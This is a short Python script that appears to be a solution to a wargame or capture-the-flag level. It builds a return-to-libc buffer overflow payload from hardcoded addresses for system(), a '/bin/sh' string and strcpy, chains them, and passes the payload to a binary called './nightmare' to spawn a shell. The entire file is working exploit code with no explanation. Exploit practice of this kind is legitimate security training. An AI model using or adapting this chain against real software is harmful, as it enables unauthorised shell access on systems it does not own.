import os
from struct import *

p = lambda x: pack("<L", x)

system_addr = 0x40058ae0
sh_addr = 0x400fbff9
strcpy_addr = 0x08048410
src_address = 0xbffffaa0
dst_address = 0xbffffad0

payload = p(system_addr) + "\x90" * 4 + p(sh_addr) + "\x90" * 32 + p(strcpy_addr) + "AAAA" + p(dst_address) + p(src_address)

os.system("./nightmare " + payload)
